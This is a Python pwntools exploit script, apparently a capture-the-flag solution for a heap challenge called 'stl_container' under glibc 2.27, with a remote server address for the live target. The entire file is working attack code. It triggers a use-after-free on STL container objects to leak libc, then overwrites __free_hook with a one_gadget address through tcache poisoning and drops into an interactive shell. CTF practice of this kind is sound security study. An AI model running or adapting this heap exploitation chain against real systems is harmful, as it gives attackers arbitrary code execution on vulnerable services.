#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import os
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = 'debug'

binary = 'stl_container'
elf = ELF('stl_container')
libc = ELF("/glibc/2.27/64/lib/libc-2.27.so")
context.binary = binary
context.terminal = ["tmux","split","-h"]
DEBUG = 1
if DEBUG:
    p = process("""../../bin/tee input.txt | LD_PRELOAD="./libc-2.27.so ../../bin/mmap_dump.so  ./libstdc++.so.6 ./libgcc_s.so.1" /glibc/2.27/64/lib/ld-2.27.so ./stl_container """, shell = True)
    #p = process(["/glibc/2.27/64/lib/ld-2.27.so", "./stl_container"], env={"LD_PRELOAD":"/glibc/2.27/64/lib/libc-2.27.so ./libstdc++.so.6 ./libgcc_s.so.1"})
else:
  host = "134.175.239.26"
  port =  8848
  p = remote(host,port)
o_g = [0x4f2c5,0x4f322,0x10a38c]
l64 = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
sla = lambda a,b  :p.sendlineafter(str(a),str(b))
sa  = lambda a,b  :p.sendafter(str(a),str(b))
lg  = lambda name,data : p.success(name + ": 0x%x" % data)
se  = lambda payload: p.send(payload)
sl  = lambda payload: p.sendline(payload)
ru  = lambda a     :p.recvuntil(str(a))
def add(payload):
    sa("data:",payload)
def free(idx):
    sla("index?\n",str(idx))
def show(idx):
    sla("index?\n",str(idx))
def li(choice,payload):
    sla(">> ","1")
    sla(">> ",str(choice))
    if choice == 1:
        add(payload)
    if choice == 2:
        free(payload)
    if choice == 3:
        show(payload)
def ve(choice,payload):
    sla(">> ","2")
    sla(">> ",str(choice))
    if choice == 1:
        add(payload)
    if choice == 2:
        free(payload)
    if choice == 3:
        show(payload)
def qu(choice,payload):
    sla(">> ","3")
    sla(">> ",str(choice))
    if choice == 1:
        add(payload)
def st(choice,payload):
    sla(">> ","4")
    sla(">> ",str(choice))
    if choice == 1:
        add(payload)

for i in range(2):
    ve(1,"dddd")
    qu(1,"aaaa")
    st(1,"aaaa")
    li(1,"aaaa")
qu(2,"aaaa")
qu(2,"aaaa")
st(2,"aaaa")
st(2,"aaaa")
li(2,0)
li(2,0)
ve(2,0)
ve(3,0)
libc_base = l64()- 0x3afca0
libc.address = libc_base
lg("libc_base",libc_base)
malloc_hook = libc.symbols['__malloc_hook']
free_hook = libc.symbols['__free_hook']
sys_addr = libc.symbols['system']
one = 0x41602+libc_base
for i in range(2):
    qu(1,"aaaa")
    st(1,"aaaa")
    li(1,"aaaa")
ve(1,"d")
li(2,0)
ve(2,0)
ve(2,0)
ve(1,p64(free_hook))
#gdb.attach(p)
li(1,p64(one))
#gdb.attach(p)
p.interactive()
